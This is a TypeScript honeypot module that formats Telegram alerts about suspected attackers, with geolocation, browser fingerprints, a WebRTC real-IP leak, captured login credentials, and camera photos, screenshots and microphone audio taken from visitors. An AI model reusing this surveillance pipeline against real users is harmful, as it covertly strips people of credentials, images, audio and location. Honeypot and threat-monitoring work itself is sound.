/**
 * Trap - Honeypot Data Collector
 * 
 * Collects attacker information and sends alerts to Telegram
 * with interactive threat management buttons.
 */

import { getGeolocation } from './geolocation';

// Configuration from environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const TELEGRAM_MESSAGE_THREAD_ID = process.env.TELEGRAM_MESSAGE_THREAD_ID ? 
  parseInt(process.env.TELEGRAM_MESSAGE_THREAD_ID) : undefined;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// ============================================
// Types
// ============================================

export interface HoneypotData {
  ip: string;
  userAgent: string;
  path: string;
  method: string;
  attackType: AttackType;
  severity: Severity;
  details?: string;
  fakeDataProvided?: boolean;
  redirectedFrom?: string;
  fingerprintUrl?: string;
  fingerprint?: BrowserFingerprint;
  cameraImage?: string;
  screenshot?: string;
  microphoneAudio?: string;
  preciseGeolocation?: GPSLocation;
  credentials?: CapturedCredentials;
}

export type AttackType = 
  | 'ENV_DISCLOSURE'
  | 'GIT_DISCLOSURE'
  | 'BRUTE_FORCE'
  | 'SQL_INJECTION'
  | 'XSS'
  | 'COMMAND_INJECTION'
  | 'PATH_TRAVERSAL'
  | 'FILE_UPLOAD'
  | 'SUSPICIOUS_UA'
  | 'SUSPICIOUS_HEADER'
  | 'FINGERPRINTING'
  | 'CREDENTIAL_HARVESTING'
  | 'CRYPTOMINER'
  | 'MALWARE_INJECTION'
  | 'WEBSHELL_UPLOAD'
  | 'RANSOMWARE'
  | 'BOTNET_C2'
  | 'DATA_EXFILTRATION'
  | 'INFO_GATHERING'
  | 'UNKNOWN';

export type Severity = 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';

export interface BrowserFingerprint {
  screen?: {
    width: number;
    height: number;
    colorDepth: number;
    pixelRatio: number;
  };
  browser?: {
    language: string;
    platform: string;
    vendor: string;
    cookiesEnabled: boolean;
    doNotTrack: string;
    hardwareConcurrency: number;
    maxTouchPoints: number;
    webdriver: boolean;
  };
  webgl?: {
    vendor: string;
    renderer: string;
  };
  canvasHash?: string;
  audioContext?: {
    sampleRate: number;
  };
  battery?: {
    level: number;
    charging: boolean;
  };
  connection?: {
    effectiveType: string;
    downlink: number;
  };
  webrtc?: {
    realIp: string;
  };
  plugins?: Array<{ name: string }>;
  fonts?: string[];
  mediaCapabilities?: {
    cameras: number;
    microphones: number;
    speakers: number;
  };
}

export interface GPSLocation {
  status: 'granted' | 'denied' | 'error' | 'pending';
  latitude?: number;
  longitude?: number;
  accuracy?: number;
  altitude?: number;
  heading?: number;
  speed?: number;
  timestamp?: number;
  mapUrl?: string;
  errorCode?: number;
  errorMessage?: string;
}

export interface CapturedCredentials {
  email?: string;
  password?: string;
  username?: string;
  remember?: boolean;
}

export interface GeoData {
  country: string;
  countryCode: string;
  city: string;
  regionName: string;
  timezone: string;
  isp: string;
  org: string;
  as: string;
  lat: number;
  lon: number;
  proxy?: boolean;
  hosting?: boolean;
}

// ============================================
// Emoji Mappings
// ============================================

const ATTACK_EMOJIS: Record<AttackType, string> = {
  ENV_DISCLOSURE: '⚠️',
  GIT_DISCLOSURE: '⚠️',
  BRUTE_FORCE: '🚨',
  SQL_INJECTION: '💉',
  XSS: '❌',
  COMMAND_INJECTION: '💻',
  PATH_TRAVERSAL: '📁',
  FILE_UPLOAD: '📤',
  SUSPICIOUS_UA: '🤖',
  SUSPICIOUS_HEADER: '🕵️',
  FINGERPRINTING: '🔍',
  CREDENTIAL_HARVESTING: '🎣',
  CRYPTOMINER: '⛏️',
  MALWARE_INJECTION: '🦠',
  WEBSHELL_UPLOAD: '🐚',
  RANSOMWARE: '💰',
  BOTNET_C2: '🕸️',
  DATA_EXFILTRATION: '📤',
  INFO_GATHERING: '🔎',
  UNKNOWN: '❓',
};

const SEVERITY_EMOJIS: Record<Severity, string> = {
  LOW: '🟢',
  MEDIUM: '🟡',
  HIGH: '🟠',
  CRITICAL: '🔴',
};

// ============================================
// Telegram Functions
// ============================================

async function sendTelegramMessage(
  text: string, 
  ip: string, 
  attackId: string, 
  reply_markup?: object
): Promise<any> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('[Trap] Telegram not configured, skipping notification');
    return null;
  }

  const url = `${TELEGRAM_API_URL}/sendMessage`;
  const payload: Record<string, any> = {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'Markdown',
  };

  if (TELEGRAM_MESSAGE_THREAD_ID) {
    payload.message_thread_id = TELEGRAM_MESSAGE_THREAD_ID;
  }

  if (reply_markup) {
    payload.reply_markup = reply_markup;
  }

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('[Trap] Telegram API Error:', data);
    }
    return data;
  } catch (error) {
    console.error('[Trap] Telegram Send Error:', error);
    throw error;
  }
}

async function sendTelegramPhoto(
  photoBase64: string, 
  caption: string
): Promise<any> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return null;
  }

  const url = `${TELEGRAM_API_URL}/sendPhoto`;
  const photoBuffer = Buffer.from(photoBase64.split(',')[1], 'base64');
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('photo', new Blob([photoBuffer], { type: 'image/jpeg' }), 'capture.jpg');
  formData.append('caption', caption);
  formData.append('parse_mode', 'Markdown');

  if (TELEGRAM_MESSAGE_THREAD_ID) {
    formData.append('message_thread_id', TELEGRAM_MESSAGE_THREAD_ID.toString());
  }

  try {
    const response = await fetch(url, {
      method: 'POST',
      body: formData,
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('[Trap] Telegram Photo API Error:', data);
    }
    return data;
  } catch (error) {
    console.error('[Trap] Telegram Send Photo Error:', error);
    throw error;
  }
}

async function sendTelegramAudio(
  audioBase64: string, 
  caption: string
): Promise<any> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return null;
  }

  const url = `${TELEGRAM_API_URL}/sendAudio`;
  const audioBuffer = Buffer.from(audioBase64.split(',')[1], 'base64');
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('audio', new Blob([audioBuffer], { type: 'audio/webm' }), 'audio.webm');
  formData.append('caption', caption);
  formData.append('parse_mode', 'Markdown');

  if (TELEGRAM_MESSAGE_THREAD_ID) {
    formData.append('message_thread_id', TELEGRAM_MESSAGE_THREAD_ID.toString());
  }

  try {
    const response = await fetch(url, {
      method: 'POST',
      body: formData,
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('[Trap] Telegram Audio API Error:', data);
    }
    return data;
  } catch (error) {
    console.error('[Trap] Telegram Send Audio Error:', error);
    throw error;
  }
}

// ============================================
// Message Formatting
// ============================================

function formatTelegramMessage(
  data: HoneypotData, 
  geoData: GeoData | null, 
  attackId: string
): string {
  const emoji = ATTACK_EMOJIS[data.attackType] || ATTACK_EMOJIS.UNKNOWN;
  const severityEmoji = SEVERITY_EMOJIS[data.severity];

  let message = `${severityEmoji} ${emoji} *HONEYPOT ALERT!* ${severityEmoji}\n\n`;
  message += `*⏰ Time:* ${new Date().toISOString()}\n`;
  message += `*🎯 Target:* \`${data.path}\`\n`;
  message += `*📡 Method:* \`${data.method}\`\n`;
  message += `*🔥 Type:* \`${data.attackType}\`\n`;
  message += `*⚠️ Severity:* \`${data.severity}\`\n`;
  message += `*🆔 Attack ID:* \`${attackId}\`\n`;

  if (data.details) {
    message += `*📝 Details:* ${data.details}\n`;
  }
  if (data.redirectedFrom) {
    message += `*↪️ Redirected From:* \`${data.redirectedFrom}\`\n`;
  }

  message += `\n━━━━━━━━━━━━━━━━━━━━\n*🌐 IP INFORMATION*\n━━━━━━━━━━━━━━━━━━━━\n`;
  message += `*📍 IP:* \`${data.ip}\`\n`;
  
  if (data.fingerprint?.webrtc?.realIp && data.fingerprint.webrtc.realIp !== 'unknown') {
    message += `*🔓 Real IP (WebRTC):* \`${data.fingerprint.webrtc.realIp}\`\n`;
  }

  if (geoData) {
    message += `\n━━━━━━━━━━━━━━━━━━━━\n*📍 GEOLOCATION*\n━━━━━━━━━━━━━━━━━━━━\n`;
    message += `*🌍 Country:* ${geoData.country} (${geoData.countryCode})\n`;
    message += `*🏙️ City:* ${geoData.city}\n`;
    message += `*🗺️ Region:* ${geoData.regionName}\n`;
    message += `*🕐 Timezone:* ${geoData.timezone}\n`;
    message += `*📡 ISP:* ${geoData.isp}\n`;
    message += `*🏢 Org:* ${geoData.org}\n`;
    message += `*🔢 ASN:* ${geoData.as}\n`;
    message += `*📌 Coords:* [${geoData.lat}, ${geoData.lon}](https://www.google.com/maps?q=${geoData.lat},${geoData.lon})\n`;
    if (geoData.proxy) message += `*🛡️ Proxy/VPN:* Yes\n`;
    if (geoData.hosting) message += `*☁️ Hosting/DC:* Yes\n`;
  }

  if (data.preciseGeolocation && data.preciseGeolocation.status === 'granted') {
    message += `\n━━━━━━━━━━━━━━━━━━━━\n*📍 PRECISE GPS*\n━━━━━━━━━━━━━━━━━━━━\n`;
    message += `*📌 Coords:* [${data.preciseGeolocation.latitude}, ${data.preciseGeolocation.longitude}](${data.preciseGeolocation.mapUrl})\n`;
    message += `*Accuracy:* ${data.preciseGeolocation.accuracy}m\n`;
  }

  if (data.userAgent) {
    message += `\n━━━━━━━━━━━━━━━━━━━━\n*🖥️ USER AGENT*\n━━━━━━━━━━━━━━━━━━━━\n`;
    message += `\`${data.userAgent.substring(0, 200)}\`\n`;
  }

  if (data.credentials) {
    message += `\n━━━━━━━━━━━━━━━━━━━━\n*🔑 CAPTURED CREDENTIALS*\n━━━━━━━━━━━━━━━━━━━━\n`;
    if (data.credentials.email) message += `*Email:* \`${data.credentials.email}\`\n`;
    if (data.credentials.username) message += `*Username:* \`${data.credentials.username}\`\n`;
    if (data.credentials.password) message += `*Password:* \`${data.credentials.password}\`\n`;
  }

  if (data.fingerprint) {
    message += `\n━━━━━━━━━━━━━━━━━━━━\n*📋 BROWSER FINGERPRINT*\n━━━━━━━━━━━━━━━━━━━━\n`;
    if (data.fingerprint.screen) {
      message += `*Screen:* ${data.fingerprint.screen.width}x${data.fingerprint.screen.height}\n`;
    }
    if (data.fingerprint.browser) {
      message += `*Platform:* ${data.fingerprint.browser.platform}\n`;
      message += `*Webdriver (Bot):* \`${data.fingerprint.browser.webdriver}\`\n`;
    }
    if (data.fingerprint.webgl?.renderer) {
      message += `*GPU:* ${data.fingerprint.webgl.renderer.substring(0, 50)}\n`;
    }
  }

  return message;
}

function getTelegramInlineKeyboard(ip: string, attackId: string, severity: Severity) {
  const baseButtons = [
    [
      { text: '📋 WHOIS', callback_data: `w:${ip}` }, 
      { text: '📧 Report', callback_data: `r:${ip}` }, 
      { text: '🌍 Geo', callback_data: `g:${ip}` }
    ],
    [
      { text: '🔍 Investigate', callback_data: `i:${ip}:${attackId.slice(0, 8)}` }, 
      { text: '✅ False Positive', callback_data: `fp:${ip}` }
    ],
  ];

  if (severity === 'CRITICAL' || severity === 'HIGH') {
    return {
      inline_keyboard: [
        [
          { text: '🚫 Block 1h', callback_data: `b1:${ip}` }, 
          { text: '🚫 Block 24h', callback_data: `b24:${ip}` }, 
          { text: '🚫 Block ∞', callback_data: `bp:${ip}` }
        ],
        ...baseButtons,
      ],
    };
  }

  return { inline_keyboard: baseButtons };
}

// ============================================
// Main Collector Function
// ============================================

export async function collectHoneypotData(data: HoneypotData): Promise<void> {
  const attackId = Math.random().toString(36).substring(2, 15);
  
  console.log(`[Trap] Collecting data for IP: ${data.ip}, Type: ${data.attackType}, Path: ${data.path}`);

  // Get geolocation data
  let geoData: GeoData | null = null;
  try {
    geoData = await getGeolocation(data.ip);
  } catch (error) {
    console.error('[Trap] Failed to get geolocation:', error);
  }

  // Format and send main message
  const message = formatTelegramMessage(data, geoData, attackId);
  const reply_markup = getTelegramInlineKeyboard(data.ip, attackId, data.severity);

  await sendTelegramMessage(message, data.ip, attackId, reply_markup);

  // Send media if captured
  if (data.cameraImage) {
    await sendTelegramPhoto(data.cameraImage, `📸 *Camera capture from* \`${data.ip}\``);
  }
  if (data.screenshot) {
    await sendTelegramPhoto(data.screenshot, `🖥️ *Screenshot from* \`${data.ip}\``);
  }
  if (data.microphoneAudio) {
    await sendTelegramAudio(data.microphoneAudio, `🎤 *Audio from* \`${data.ip}\``);
  }
}

export default collectHoneypotData;

